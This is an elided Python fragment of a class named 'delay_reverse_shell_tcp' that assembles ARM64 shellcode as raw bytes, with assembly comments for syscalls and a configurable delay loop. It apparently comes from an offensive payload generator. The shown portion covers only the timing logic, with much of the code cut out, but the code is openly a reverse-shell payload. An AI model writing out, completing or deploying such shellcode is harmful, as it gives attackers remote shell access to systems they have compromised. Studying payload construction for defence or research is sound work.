...
class delay_reverse_shell_tcp():
    ...
    def run(self):
        ...
        self.shellcode2 += b"\x90\x0E\x80\xD2"    # movz x16, #0x74
        self.shellcode2 += b"\x01\x10\x00\xD4"    # svc  #0x80
        self.shellcode2 += b"\xE1\x03\x40\xF9"    # ldr  x1, [sp]
        # Delay calculation here
        # it's  \x3B\ + struct.pack("<H" DELAY * 4) + \x91\
        self.shellcode2 += b"\x3B"
        self.shellcode2 += struct.pack("<H", int(self.DELAY) * 4)
        self.shellcode2 += b"\x91"
        # self.shellcode2 += b"\x3B\x3C\x00\x91"    # add  x27, x1, #0xf //DELAY
        self.shellcode2 += b"\xE0\x03\x00\x91"    # mov  x0, sp
        self.shellcode2 += b"\x01\x00\x80\xD2"    # movz x1, #0
        self.shellcode2 += b"\x90\x0E\x80\xD2"    # movz x16, #0x74
        self.shellcode2 += b"\x01\x10\x00\xD4"    # svc  #0x80
        ...
        self.shellcode2 += b"\x4D\xFF\xFF\x54"    # b.le #0x18
